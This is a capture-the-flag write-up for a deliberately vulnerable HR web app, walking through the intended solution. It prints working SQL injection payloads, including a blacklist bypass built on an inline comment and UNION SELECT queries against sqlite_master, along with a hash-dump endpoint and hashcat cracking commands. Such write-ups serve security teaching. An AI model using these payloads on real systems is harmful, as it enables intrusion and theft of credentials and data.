# SecureHR

**Category:** Web  **Author:** N1sh

Run: `./run.sh` (or `docker build -t web_n1sh_3 . && docker run -p 3000:3000 web_n1sh_3`)

## Solution

The app is an HR portal with a login page and an employee search behind it. A bit of directory brute forcing turns up `/getusers`, which dumps every user with their SHA-256 password hash:

```
curl http://localhost:3000/getusers
```

Most of the hashes are long random passwords and not worth the time. Two of them crack instantly with rockyou:

```
hashcat -m 1400 hashes.txt rockyou.txt
rohith : password123
mative : admin123
```

Login itself uses a parameterised query, so log in properly as one of them and go to `/search`. The search box goes straight into a `LIKE` clause:

```sql
SELECT username, email, role, created_at FROM users
WHERE username LIKE '%<query>%' OR email LIKE '%<query>%'
```

`%` alone returns everyone, which confirms it. There is a keyword blacklist (`union select`, `or 1=1`, `drop table`, ...), but it only collapses whitespace before matching, so an inline comment between `UNION` and `SELECT` walks right past it. The query has four columns. List the tables first:

```
%' UNION/**/SELECT name,type,sql,'' FROM sqlite_master--
```

That shows an `admin_secrets` table. It holds a couple of decoy flags; the real one is the row with `access_level = 9`:

```
%' UNION/**/SELECT flag,secret_key,description,'' FROM admin_secrets--
```

Shortcut: `/user/:username` builds its query the same way, has no filter and needs no login, so `/user/x' UNION SELECT 1,flag,3,4,5,6 FROM admin_secrets WHERE access_level=9--` (URL-encoded) works too.

Flag: `H7CTF{W1LD_C4RD5_4R3_D4NG3R0U5_1N_5QL_1NJ3CT10N_<uuid>}` (UUID generated per container)
